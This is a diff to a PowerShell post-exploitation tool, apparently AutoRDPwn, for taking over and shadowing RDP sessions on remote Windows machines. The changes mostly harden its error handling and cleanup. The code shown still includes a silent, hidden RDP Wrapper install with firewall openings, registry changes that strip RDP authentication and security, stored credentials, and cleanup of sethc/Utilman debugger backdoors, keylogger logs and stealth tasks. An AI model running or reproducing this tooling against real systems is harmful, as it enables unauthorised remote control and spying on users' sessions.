@@ -6,8 +6,14 @@ $script:ARWorkDirs = New-Object System.Collections.Generic.List[string]
 $script:ARTemporaryFiles = New-Object System.Collections.Generic.List[string]
 $script:ARRemoteTempDirs = New-Object System.Collections.Generic.List[string]
 $script:ARHashUserName = ''
+$script:ARCreatedAccounts = New-Object System.Collections.Generic.List[string]
+$script:ARRemoteTasks = New-Object System.Collections.Generic.List[string]
+$script:ARFirewallRules = New-Object System.Collections.Generic.List[string]
 $script:ARCmdKeyTargets = New-Object System.Collections.Generic.List[string]
 $script:ARCleanupDone = $false
+$script:ARLastFailure = ''
+$script:ARRegistryBackup = New-Object System.Collections.Generic.List[object]
+$script:ARInstalledProducts = New-Object System.Collections.Generic.List[string]
 
 function Invoke-ARDownload {
     param(
@@ -31,8 +37,12 @@ function Get-ARResourcePath {
     param([Parameter(Mandatory = $true)][string]$RelativePath)
     $normalized = $RelativePath -replace '/', '\'
     $localPath = Join-Path $script:ARRoot $normalized
-    if ($script:ARLocal -and (Test-Path -LiteralPath $localPath)) { return $localPath }
     if (Test-Path -LiteralPath $localPath) { return $localPath }
+    # Fail closed: a missing resource is a broken install, not a reason to pull
+    # code from the network and dot-source it with administrator rights.
+    if ($env:AUTORD_PWN_ALLOW_DOWNLOAD -ne '1') {
+        throw ('Missing resource: ' + $localPath + '. Restore it from the repository (set AUTORD_PWN_ALLOW_DOWNLOAD=1 to fetch it from ' + $script:ARRepository + ').')
+    }
     $parent = Split-Path -Parent $localPath
     if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
     $url = $script:ARRepository + '/' + ($normalized -replace '\\', '/')
@@ -97,6 +107,16 @@ function Initialize-ARLanguage {
 }
 
 function Get-ARLocalIPv4 {
+    param([string]$Target = '')
+    if (-not [string]::IsNullOrWhiteSpace($Target) -and $Target -notin @('localhost', '127.0.0.1', '::1', '.')) {
+        try {
+            $best = Find-NetRoute -RemoteIPAddress $Target -ErrorAction Stop | Select-Object -First 1
+            if ($best -and $best.IPAddress -and $best.IPAddress -notlike '169.254.*') {
+                return [string]$best.IPAddress
+            }
+        }
+        catch { }
+    }
     try {
         $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop |
             Sort-Object RouteMetric, InterfaceMetric |
@@ -110,8 +130,10 @@ function Get-ARLocalIPv4 {
     }
     catch { }
     try {
+        $virtual = 'vEthernet|VPN|TAP|ZeroTier|Loopback|Bluetooth|OpenVPN|WireGuard|Hyper-V|Pseudo'
         $address = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
             Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.254.*' } |
+            Sort-Object { if ($_.InterfaceAlias -match $virtual) { 1 } else { 0 } } |
             Select-Object -First 1
         if ($address) { return [string]$address.IPAddress }
     }
@@ -119,8 +141,36 @@ function Get-ARLocalIPv4 {
     return ''
 }
 
-function Initialize-ARDefender {
-    $script:ARDefenderAddedPaths.Clear()
+function Test-ARPort {
+    param(
+        [Parameter(Mandatory = $true)][string]$Computer,
+        [Parameter(Mandatory = $true)][int]$Port,
+        [int]$TimeoutMs = 2000
+    )
+    if ([string]::IsNullOrWhiteSpace($Computer)) { return $false }
+    if ($Computer -in @('localhost', '127.0.0.1', '::1', '.')) { return $true }
+    $client = New-Object System.Net.Sockets.TcpClient
+    try {
+        $async = $client.BeginConnect($Computer, $Port, $null, $null)
+        if (-not $async.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) { return $false }
+        $client.EndConnect($async)
+        return $true
+    }
+    catch { return $false }
+    finally { $client.Close() }
+}
+
+function Assert-ARPort {
+    param(
+        [Parameter(Mandatory = $true)][string]$Computer,
+        [Parameter(Mandatory = $true)][int]$Port,
+        [string]$Purpose = 'This action'
+    )
+    if (Test-ARPort -Computer $Computer -Port $Port) { return }
+    throw ($Purpose + ' needs TCP ' + $Port + ' on ' + $Computer + ' and it is closed or filtered.')
+}
+
+function Initialize-ARDefender {    $script:ARDefenderAddedPaths.Clear()
     try {
         $preference = Get-MpPreference -ErrorAction Stop
     }
@@ -155,6 +205,9 @@ function Write-ARBlank { Write-Host '' }
 
 function Read-ARValue {
     param([string]$Prompt, [string]$Default = '')
+    if ($script:ARInvokedFromOption) {
+        throw ('Missing value for "' + $Prompt + '": it cannot be prompted for in -option mode.')
+    }
     while ($true) {
         $suffix = ': '
         if ($Default -ne '') { $suffix = ' [' + $Default + ']: ' }
@@ -169,6 +222,9 @@ function Read-ARValue {
 
 function Read-ARSecret {
     param([string]$Prompt = 'Password')
+    if ($script:ARInvokedFromOption) {
+        throw ('Missing value for "' + $Prompt + '": it cannot be prompted for in -option mode.')
+    }
     while ($true) {
         $value = Read-ARSecretValue (' ' + $Prompt + ': ')
         if ($null -ne $value -and $value -ne '') { return $value }
@@ -177,12 +233,13 @@ function Read-ARSecret {
 }
 
 function Show-ARText {
-    param($Value)
+    param($Value, [switch]$Copy)
     if ($null -eq $Value) { return }
     $text = ($Value | Out-String).TrimEnd()
     if ($text -eq '') { return }
     Write-Host $text
-    if ($text.Length -lt 1048576) {
+    # Clipboard is opt-in: results can contain credentials and dumps.
+    if ($Copy -and $text.Length -lt 1048576) {
         try { Set-Clipboard -Value $text } catch { }
     }
 }
@@ -248,6 +305,11 @@ function Connect-ARTargetSession {
     if ($null -eq $Credential) { $Credential = Get-ARTargetCredential }
     $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
     if ($Credential) { $parameters['Credential'] = $Credential }
+    # Bounded timeouts: an unreachable host must fail in ~15s, not hang for minutes.
+    try {
+        $parameters['SessionOption'] = New-PSSessionOption -OpenTimeout 15000 -OperationTimeout 180000 -CancelTimeout 5000
+    }
+    catch { }
     $session = New-PSSession @parameters
     $script:ARSession = $session
     Set-ARSessionState ('connected (' + $target + ')')
@@ -425,16 +487,43 @@ function Get-ARPayloads {
 }
 
 function Get-ARSessionId {
-    param($Lines, [int]$Fallback = 1)
-    $ids = New-Object System.Collections.Generic.List[int]
-    foreach ($line in @($Lines)) {
-        $text = [string]$line
-        if ($text -match '^\s*>?\s*.*?\s+(\d+)\s+(?:Active|Disc|Conn|Listen|Inact|Start|Down)\b') {
-            $id = [int]$Matches[1]
-            if ($id -gt 0 -and -not $ids.Contains($id)) { $ids.Add($id) }
+    param($Lines = $null, [int]$Fallback = 1)
+    # $Lines is kept for callers that still hand over `query session` output; that
+    # output is localised, so it is only ever displayed, never parsed.
+    $discovery = {
+        try {
+            $explorer = Get-CimInstance -ClassName Win32_Process -Filter "Name = 'explorer.exe'" -ErrorAction Stop |
+                Sort-Object SessionId | Select-Object -Last 1
+            if ($explorer -and [int]$explorer.SessionId -gt 0) { return [int]$explorer.SessionId }
         }
+        catch { }
+        try {
+            $logons = @(Get-CimInstance -ClassName Win32_LogonSession -ErrorAction Stop |
+                Where-Object { $_.LogonType -eq 2 -or $_.LogonType -eq 10 } |
+                Sort-Object StartTime)
+            foreach ($logon in $logons) {
+                $processes = @(Get-CimAssociatedInstance -InputObject $logon -ResultClassName Win32_Process -ErrorAction SilentlyContinue)
+                $ids = @($processes | Where-Object { $_.SessionId -gt 0 } | ForEach-Object { [int]$_.SessionId } | Sort-Object -Unique)
+                if ($ids.Count -gt 0) { return [int]$ids[$ids.Count - 1] }
+            }
+        }
+        catch { }
+        return 0
     }
-    if ($ids.Count -gt 0) { return ($ids | Sort-Object | Select-Object -First 1) }
+    $sessionId = 0
+    $session = $null
+    # A missing $script:ARTarget (early teardown, tests) must not turn this into a throw.
+    $local = $true
+    try { $local = Test-ARIsLocalTarget } catch { $local = $true }
+    if ($Lines -is [System.Management.Automation.Runspaces.PSSession]) { $session = $Lines }
+    elseif (-not $local) { $session = $script:ARSession }
+    if ($session) {
+        try { $sessionId = [int](Invoke-Command -Session $session -ScriptBlock $discovery -ErrorAction Stop) } catch { $sessionId = 0 }
+    }
+    elseif ($local) {
+        try { $sessionId = [int](& $discovery) } catch { $sessionId = 0 }
+    }
+    if ($sessionId -gt 0) { return $sessionId }
     return $Fallback
 }
 
@@ -452,17 +541,44 @@ function Install-ARRdpWrap {
         $remoteMsi = Join-Path $remoteDirectory 'Setup.msi'
         $remoteMsi = Copy-ARFileToTarget -LocalPath $msiPath -RemotePath $remoteMsi
         $ruleName = Get-ARText 'Pwn6' 'RDP session agent'
-        Invoke-Command -Session $Session -ArgumentList $remoteMsi, $ruleName -ScriptBlock {
-            param($msi, $rule)
-            Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $msi, '/quiet', '/qn', '/norestart') -Wait
+        if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) }
+        $uninstallRoots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
+        $install = Invoke-Command -Session $Session -ArgumentList $remoteMsi, $ruleName, $uninstallRoots -ScriptBlock {
+            param($msi, $rule, $roots)
+            # Products present before this run: anything else in the diff came from us.
+            $before = @{}
+            foreach ($root in $roots) {
+                if (-not (Test-Path -LiteralPath $root)) { continue }
+                foreach ($key in @(Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue)) {
+                    $before[$key.PSChildName] = [string](Get-ItemProperty -LiteralPath $key.PSPath -Name DisplayName -ErrorAction SilentlyContinue).DisplayName
+                }
+            }
+            $process = Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $msi, '/quiet', '/qn', '/norestart') -Wait -PassThru
             netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
             netsh advfirewall firewall add rule name="$rule" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
             netsh advfirewall firewall add rule name="$rule" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
             attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null
             attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null
             if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 -ErrorAction SilentlyContinue }
+            $products = New-Object System.Collections.Generic.List[string]
+            if ($process.ExitCode -eq 0 -or $process.ExitCode -eq 3010) {
+                foreach ($root in $roots) {
+                    if (-not (Test-Path -LiteralPath $root)) { continue }
+                    foreach ($key in @(Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue)) {
+                        if (-not $before.ContainsKey($key.PSChildName)) { $products.Add([string]$key.PSChildName) }
+                    }
+                }
+            }
             Remove-Item -LiteralPath (Split-Path -Parent $msi) -Recurse -Force -ErrorAction SilentlyContinue
+            return [pscustomobject]@{ ExitCode = $process.ExitCode; Products = @($products.ToArray()) }
         } -ErrorAction Stop
+        foreach ($product in @($install.Products)) {
+            if ([string]::IsNullOrWhiteSpace([string]$product)) { continue }
+            if (-not $script:ARInstalledProducts.Contains([string]$product)) { $script:ARInstalledProducts.Add([string]$product) }
+        }
+        if ($install.ExitCode -ne 0 -and $install.ExitCode -ne 3010) {
+            Write-ARWarn ('RDPWrap installer returned ' + $install.ExitCode)
+        }
     }
     finally {
         Pop-Location
@@ -483,6 +599,7 @@ function Invoke-ARShadowEngine {
     $previous = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
         $terminalServer = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
         $winstation = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+        $registryBackup = New-Object System.Collections.Generic.List[object]
         function Get-ARRemoteValue($path, $name) {
             try {
                 $item = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
@@ -490,20 +607,44 @@ function Invoke-ARShadowEngine {
             }
             catch { return $null }
         }
+        # Every write records the previous state first so cleanup can replay it.
+        function Save-ARRemoteValue($path, $name) {
+            $entry = [pscustomobject]@{
+                KeyPath = $path
+                Name    = $name
+                Existed = $false
+                Value   = $null
+                Kind    = 'String'
+            }
+            try {
+                $key = Get-Item -LiteralPath $path -ErrorAction Stop
+                if (@($key.GetValueNames()) -contains $name) {
+                    $entry.Existed = $true
+                    $entry.Value = $key.GetValue($name, $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
+                    $entry.Kind = [string]$key.GetValueKind($name)
+                }
+            }
+            catch { }
+            $registryBackup.Add($entry)
+        }
+        function Set-ARRemoteDword($path, $name, $value) {
+            Save-ARRemoteValue $path $name
+            New-ItemProperty -Path $path -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
+        }
         $allowRemoteRpc = Get-ARRemoteValue $terminalServer 'AllowRemoteRPC'
-        New-ItemProperty -Path $terminalServer -Name 'AllowRemoteRPC' -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path $terminalServer -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM' -Name 'AllowAnonymousCallback' -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareWks' -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareServer' -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowToGetHelp' -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowFullControl' -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path $winstation -Name 'SecurityLayer' -Value 0 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path $winstation -Name 'UserAuthentication' -Value 0 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'LocalAccountTokenFilterPolicy' -Value 1 -PropertyType DWORD -Force | Out-Null
+        Set-ARRemoteDword $terminalServer 'AllowRemoteRPC' 1
+        Set-ARRemoteDword $terminalServer 'fDenyTSConnections' 0
+        Set-ARRemoteDword 'HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM' 'AllowAnonymousCallback' 1
+        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'DisableRestrictedAdmin' 0
+        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'AutoShareWks' 1
+        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'AutoShareServer' 1
+        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' 'fAllowToGetHelp' 1
+        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' 'fAllowFullControl' 1
+        Set-ARRemoteDword $winstation 'SecurityLayer' 0
+        Set-ARRemoteDword $winstation 'UserAuthentication' 0
+        Set-ARRemoteDword 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'LocalAccountTokenFilterPolicy' 1
         New-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Force | Out-Null
-        New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Name 'AllowEncryptionOracle' -Value 2 -PropertyType DWORD -Force | Out-Null
+        Set-ARRemoteDword 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' 'AllowEncryptionOracle' 2
         Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' -ErrorAction SilentlyContinue
         if (-not (Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -ErrorAction SilentlyContinue)) {
             New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any -ErrorAction SilentlyContinue | Out-Null
@@ -521,14 +662,36 @@ function Invoke-ARShadowEngine {
             HostName = $env:COMPUTERNAME
             SessionId = $sessionId
             Caption = $caption
+            RegistryBackup = @($registryBackup.ToArray())
         }
+    }
+    foreach ($entry in @($previous.RegistryBackup)) {
+        if (-not $entry) { continue }
+        # The oldest snapshot wins: a second run must not record the values it just wrote.
+        $known = $false
+        foreach ($existing in $script:ARRegistryBackup) {
+            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
+        }
+        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
     }
 
         $plain = ''
         if ($credential) { $plain = $credential.GetNetworkCredential().Password }
         if ($credential -and $plain -ne '') {
-            cmdkey.exe "/add:$target" "/user:$($credential.UserName)" "/pass:$plain" 2>&1> $null
+            # Tracked before the add: an interrupted run must still delete the credential.
             if (-not $script:ARCmdKeyTargets.Contains($target)) { $script:ARCmdKeyTargets.Add($target) }
+            $stored = $false
+            try {
+                cmdkey.exe "/add:$target" "/user:$($credential.UserName)" "/pass:$plain" 2>&1> $null
+                if ($LASTEXITCODE -ne 0) { throw ('cmdkey /add exited with code ' + $LASTEXITCODE) }
+                $stored = $true
+            }
+            catch {
+                Write-ARWarn ('Stored credential for ' + $target + ' was not created: ' + $_.Exception.Message)
+            }
+            finally {
+                if (-not $stored) { cmdkey.exe "/delete:$target" 2>&1> $null }
+            }
         }
         Write-ARInfo ((([string](Get-ARText 'txt33' 'Detecting operating system version on')).TrimEnd()) + ' ' + ([string]$previous.HostName).ToLowerInvariant())
         if ($null -eq $previous.AllowRemoteRpc -or [int]$previous.AllowRemoteRpc -eq 0) {
@@ -556,7 +719,7 @@ function Invoke-ARShadowEngine {
             } catch { }
             $query = Invoke-Command -Session $session -ScriptBlock { query session 2>&1 } -ErrorAction SilentlyContinue
             Show-ARText $query
-            $sessionId = Get-ARSessionId $query 1
+            $sessionId = Get-ARSessionId -Lines $session -Fallback 1
             if (-not $script:ARInvokedFromOption) {
                 $answer = Read-ARValue (Get-ARText 'txt36' 'What session do you want to connect to?') ([string]$sessionId)
                 if ($answer -match '^\d+$') { $sessionId = [int]$answer }
@@ -596,11 +759,13 @@ function Invoke-ARAction {
     }
     Clear-ARScreen
     Set-ARStatus ($action.Title) 'Info'
+    $script:ARLastFailure = ''
     try {
         & $action.Handler
         if ($script:ARStatus['Kind'] -eq 'Info') { Set-ARStatus ($action.Title + ' finished') 'Ok' }
     }
     catch {
+        $script:ARLastFailure = $_.Exception.Message
         Set-ARStatus $_.Exception.Message 'Error'
         Write-ARError $_.Exception.Message
     }
@@ -611,46 +776,179 @@ function Invoke-ARAction {
     }
 }
 
+function Remove-ARTargetArtifacts {
+    param([System.Management.Automation.Runspaces.PSSession]$Session)
+    $status = [pscustomobject]@{
+        HadSession = $false
+        Errors     = 0
+        Skipped    = New-Object System.Collections.Generic.List[string]
+    }
+    if (-not $Session) {
+        $status.Skipped.Add('target session')
+        return $status
+    }
+    $status.HadSession = $true
+    $tempDirs = @($script:ARRemoteTempDirs.ToArray())
+    $accounts = @($script:ARCreatedAccounts.ToArray())
+    if ($script:ARHashUserName -ne '') { $accounts += $script:ARHashUserName }
+    $rules = @($script:ARFirewallRules.ToArray())
+    try {
+        Invoke-Command -Session $Session -ArgumentList $tempDirs, $accounts, $rules -ScriptBlock {
+            param($dirs, $users, $firewallRules)
+            Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Stop-Job -ErrorAction SilentlyContinue
+            Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Remove-Job -Force -ErrorAction SilentlyContinue
+            # Tasks created by the stealth screen module survive an interrupted run.
+            try {
+                Get-ScheduledTask -ErrorAction Stop | Where-Object {
+                    $_.TaskName -like 'AutoRDPwn*' -or ($_.TaskName -match '^W[0-9A-F]{8}$' -and (($_.Actions | ForEach-Object { [string]$_.Execute + ' ' + [string]$_.Arguments }) -join ' ') -match 'Windows\\Temp\\W[0-9A-F]{8}\.ps1')
+                } | ForEach-Object {
+                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+                }
+            }
+            catch { }
+            Remove-Item -LiteralPath 'C:\Windows\Temp\vncb64.txt', 'C:\Windows\Temp\vnc.ps1', 'C:\Windows\Temp\vnclog.txt', 'C:\Windows\Temp\ss.ps1' -Force -ErrorAction SilentlyContinue
+            Get-ChildItem -LiteralPath 'C:\Windows\Temp' -Directory -Filter 'AutoRDPwn*' -ErrorAction SilentlyContinue |
+                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+            foreach ($directory in $dirs) {
+                Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
+            }
+            foreach ($service in @('WinShotSvc', 'WinSessionSvc')) {
+                if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
+                    sc.exe stop $service 2>&1> $null
+                    sc.exe delete $service 2>&1> $null
+                }
+            }
+            foreach ($userName in $users) {
+                if (-not $userName) { continue }
+                try {
+                    if (Get-LocalUser -Name $userName -ErrorAction Stop) {
+                        net user $userName /delete 2>&1> $null
+                        Remove-Item -LiteralPath (Join-Path 'C:\Users' $userName) -Recurse -Force -ErrorAction SilentlyContinue
+                    }
+                }
+                catch { }
+            }
+            foreach ($key in @('sethc.exe', 'Utilman.exe')) {
+                $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
+                try {
+                    $debugger = (Get-ItemProperty -Path $path -Name 'Debugger' -ErrorAction Stop).Debugger
+                    if ([string]$debugger -like 'powershell.exe -noexit*') {
+                        Remove-ItemProperty -Path $path -Name 'Debugger' -Force -ErrorAction SilentlyContinue
+                    }
+                }
+                catch { }
+            }
+            foreach ($rule in @($firewallRules + 'AutoRDPwn-TermService-RPC-In')) {
+                netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
+            }
+        } -ErrorAction Stop | Out-Null
+    }
+    catch {
+        $status.Errors++
+        $status.Skipped.Add('target artifacts')
+        Write-ARWarn ('Target cleanup incomplete: ' + $_.Exception.Message)
+    }
+
+    # Registry values written by the shadow engine: replay the state read before each write.
+    $registryBackup = @($script:ARRegistryBackup.ToArray())
+    if ($registryBackup.Count -gt 0) {
+        try {
+            $failures = @(Invoke-Command -Session $Session -ArgumentList $registryBackup -ScriptBlock {
+                param($entries)
+                $failed = New-Object System.Collections.Generic.List[string]
+                foreach ($entry in $entries) {
+                    $path = [string]$entry.KeyPath
+                    $name = [string]$entry.Name
+                    try {
+                        if (-not (Test-Path -LiteralPath $path)) { continue }
+                        if (-not $entry.Existed) {
+                            Remove-ItemProperty -Path $path -Name $name -Force -ErrorAction SilentlyContinue
+                            continue
+                        }
+                        $kind = [string]$entry.Kind
+                        $value = $entry.Value
+                        if ($kind -eq 'MultiString') { $value = [string[]]@($entry.Value) }
+                        elseif ($kind -eq 'Binary') { $value = [byte[]]@($entry.Value) }
+                        elseif ($kind -eq 'DWord' -or $kind -eq 'QWord') { $value = [int64]$entry.Value }
+                        else { $value = [string]$entry.Value }
+                        New-ItemProperty -Path $path -Name $name -Value $value -PropertyType $kind -Force -ErrorAction SilentlyContinue | Out-Null
+                    }
+                    catch { $failed.Add($name + ': ' + $_.Exception.Message) }
+                }
+                return $failed.ToArray()
+            } -ErrorAction Stop)
+            foreach ($failure in $failures) {
+                $status.Errors++
+                $status.Skipped.Add('registry: ' + [string]$failure)
+                Write-ARWarn ('Registry value not restored: ' + [string]$failure)
+            }
+        }
+        catch {
+            $status.Errors++
+            $status.Skipped.Add('registry restore')
+            Write-ARWarn ('Registry restore incomplete: ' + $_.Exception.Message)
+        }
+        $script:ARRegistryBackup.Clear()
+    }
+
+    # MSI products that appeared during this run: uninstall them by product code.
+    $products = @($script:ARInstalledProducts.ToArray())
+    if ($products.Count -gt 0) {
+        try {
+            $failures = @(Invoke-Command -Session $Session -ArgumentList $products -ScriptBlock {
+                param($productCodes)
+                $roots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
+                $failed = New-Object System.Collections.Generic.List[string]
+                foreach ($code in $productCodes) {
+                    try {
+                        if ([string]$code -match '^\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}$') {
+                            Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/x', [string]$code, '/qn', '/norestart') -Wait
+                        }
+                        foreach ($root in $roots) {
+                            $key = Join-Path $root ([string]$code)
+                            if (Test-Path -LiteralPath $key) { Remove-Item -LiteralPath $key -Recurse -Force -ErrorAction SilentlyContinue }
+                        }
+                    }
+                    catch { $failed.Add([string]$code + ': ' + $_.Exception.Message) }
+                }
+                return $failed.ToArray()
+            } -ErrorAction Stop)
+            foreach ($failure in $failures) {
+                $status.Errors++
+                $status.Skipped.Add('msi: ' + [string]$failure)
+                Write-ARWarn ('MSI product not removed: ' + [string]$failure)
+            }
+        }
+        catch {
+            $status.Errors++
+            $status.Skipped.Add('msi uninstall')
+            Write-ARWarn ('MSI uninstall incomplete: ' + $_.Exception.Message)
+        }
+        $script:ARInstalledProducts.Clear()
+    }
+    return $status
+}
+
 function Invoke-ARCleanup {
     if ($script:ARCleanupDone) { return }
     $script:ARCleanupDone = $true
-    if ($script:ARNoClean) {
-        Close-ARTargetSession
-        Restore-ARDefender
-        $script:AROverrideCredential = $null
-        return
+    $targetStatus = $null
+    if (-not $script:ARNoClean) {
+        $targetStatus = Remove-ARTargetArtifacts -Session $script:ARSession
+        $script:ARHashUserName = ''
     }
-    if ($script:ARSession) {
-        try {
-            Invoke-Command -Session $script:ARSession -ScriptBlock {
-                Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Stop-Job -ErrorAction SilentlyContinue
-                Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Remove-Job -Force -ErrorAction SilentlyContinue
-            } -ErrorAction SilentlyContinue | Out-Null
-        } catch { }
-        foreach ($directory in $script:ARRemoteTempDirs.ToArray()) {
-            try {
-                Invoke-Command -Session $script:ARSession -ArgumentList $directory -ScriptBlock {
-                    param($path)
-                    Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
-                } -ErrorAction SilentlyContinue | Out-Null
-            } catch { }
-        }
-    }
-    if ($script:ARHashUserName -ne '' -and $script:ARSession) {
-        try {
-            Invoke-Command -Session $script:ARSession -ArgumentList $script:ARHashUserName -ScriptBlock {
-                param($name)
-                net user $name /delete 2>&1> $null
-                Remove-Item -LiteralPath (Join-Path 'C:\Users' $name) -Recurse -Force -ErrorAction SilentlyContinue
-                Unregister-ScheduledTask -TaskName 'AutoRDPwn' -Confirm:$false -ErrorAction SilentlyContinue
-            } -ErrorAction SilentlyContinue | Out-Null
-        } catch { }
-    }
-    $script:ARHashUserName = ''
+    # Operator-side traces are always removed, even with -noclean: a stored
+    # credential or an extracted binary must not outlive the session.
     foreach ($target in $script:ARCmdKeyTargets.ToArray()) {
         cmdkey.exe "/delete:$target" 2>&1> $null
     }
     $script:ARCmdKeyTargets.Clear()
+    # Module artifacts (keylogger log, RDP cache) live on the target, so they
+    # have to go while the session is still open. The operator-side proxy reset
+    # below can wait until after teardown.
+    if (Get-Command Remove-ARModuleArtifacts -ErrorAction SilentlyContinue) {
+        try { Remove-ARModuleArtifacts } catch { }
+    }
     Close-ARTargetSession
     Restore-ARDefender
     foreach ($directory in $script:ARWorkDirs.ToArray()) {
@@ -666,7 +964,24 @@ function Invoke-ARCleanup {
     $script:ARWorkDirs.Clear()
     $script:ARTemporaryFiles.Clear()
     $script:ARRemoteTempDirs.Clear()
+    $script:ARRemoteTasks.Clear()
+    $script:ARCreatedAccounts.Clear()
+    $script:ARFirewallRules.Clear()
     $script:AROverrideCredential = $null
+    if (Get-Command Reset-AROperatorPortProxies -ErrorAction SilentlyContinue) {
+        try { Reset-AROperatorPortProxies } catch { }
+    }
     try { Set-Location -LiteralPath $script:AROriginalLocation } catch { }
-    Write-ARInfo (Get-ARText 'txt76' 'Cleaning done!')
+    if ($targetStatus -and -not $targetStatus.HadSession) {
+        $targetName = 'the target'
+        try { $targetName = Get-ARTargetComputer } catch { }
+        Write-ARWarn ('Cleanup skipped: no session to ' + $targetName)
+    }
+    elseif ($targetStatus -and $targetStatus.Errors -gt 0) {
+        $steps = @($targetStatus.Skipped | Select-Object -First 5)
+        Write-ARWarn ((Get-ARText 'txt76' 'Cleaning done!') + ' ' + $targetStatus.Errors + ' step(s) failed: ' + ($steps -join '; '))
+    }
+    else {
+        Write-ARInfo (Get-ARText 'txt76' 'Cleaning done!')
+    }
 }
